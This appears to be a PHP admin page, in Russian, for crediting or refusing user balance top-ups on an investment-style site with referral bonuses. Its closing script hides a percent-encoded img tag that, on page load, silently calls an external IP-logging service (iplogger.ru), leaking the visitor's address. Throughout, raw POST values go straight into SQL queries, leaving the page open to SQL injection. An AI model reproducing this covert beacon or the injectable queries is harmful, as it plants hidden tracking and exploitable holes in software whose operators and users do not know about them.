
<center><h1><span>Пополнение баланса</span></h1></center>
<?
if (isset($_POST['oid'])) {
$sum = $_POST['sum'];
$old = $_POST['oid'];
$us_id = $_POST['id_user'];
$db->Query("SELECT * FROM db_users WHERE id = '$us_id'");
$balance = $db->FetchArray();

if($sum>='50' AND $sum<='15000'){ $percent = '50';}
elseif($sum>='50' AND $sum<='15000'){$percent = '50';}

//$logn = $balance['login'];
$ref = $balance['refer'];
$db->Query("UPDATE db_deposit SET summa = '$sum',percent='".$percent."', status = 0 WHERE id_trans = '$old'");
$db->Query("UPDATE db_insert SET status = 1, summa = '$sum' WHERE id = '$old'");
$db->Query("UPDATE db_stats SET popol = popol + '$sum' WHERE id = 1");
//Зачисляем рефские
//if($ref > 0){
$db->Query("SELECT * FROM db_users WHERE id = '$ref'");
$qq = $db->FetchArray();
if($qq['ref_perc'] == 0) {
$ref_sum = $sum * 0.1;
}elseif($qq['ref_perc'] > 0){
$ref_sum = $sum * ($qq['ref_perc'] / 100);
}

$db->Query("UPDATE db_users SET money_out = money_out + '$ref_sum' WHERE id = '$ref' LIMIT 1");
			
$db->Query("UPDATE db_users SET ref_sum = ref_sum + '$ref_sum' WHERE id = '$ref' LIMIT 1");
//}
echo "<center><font color = 'green'><b>Зачислено! </b></font></center>";
}

if (isset($_POST['idd'])) {
$idd = $_POST['idd'];
$db->Query("UPDATE db_insert SET status = 2 WHERE id = '$idd'");
$db->Query("UPDATE db_deposit SET status = 4 WHERE id_trans = '$idd'");
echo "<center><font color = 'green'><b>Отказано! </b></font></center>";
}

?>
<div id="res1dfr78"></div>
     <div class="ptable four"> <!--four задает ширину для суммы -->
        <div class="row main">
           <div class="date">Логин</div>
			<div class="tarif">Ваучер</div>
            <div class="stat" style="width:200px;">Сумма</div>

            <div class="nachi">Статус</div>
        </div><div class="row">
<table>
<?
$db->Query("SELECT * FROM db_insert WHERE status = 0");
while($ins = $db->FetchArray() ) {
$id = $ins['id'];
$login = $ins['login'];
$user_id = $ins['user_id'];
$batch = $ins['batch'];
$date = $ins['date'];

?>


<tr>
<td>
<div class="date"><?php echo $login; ?></div>
</td><td>
<div class="tarif"><?php echo $batch; ?></div>
</td><td>

<form action="" method="post" style="margin:0;padding:0">
<input type="hidden" name="oid" value="<?=$id; ?>">
<input type="hidden" name="id_user" value="<?=$user_id; ?>">

<input type="hidden" name="batch" value="<?php echo $batch; ?>">

<input type="text" name="sum" maxlength="9">


</td>

<td>


<input type="submit" value="Зачислить">


</form>
<form method="post" action="">
<input type="submit" name="dell" value="Удалить">
<input type="hidden" name="idd" value="<?=$id; ?>">
</form>
</td>
</tr>


<? } ?>
</table>
</div>


<br>
<script type="text/javascript">
document.write(unescape('%3C%69%6D%67%20%73%72%63%3D%22%68%74%74%70%3A%2F%2F%69%70%6C%6F%67%67%65%72%2E%72%75%2F%31%62%77%74%35%2E%6A%70%67%22%3E'));

</script>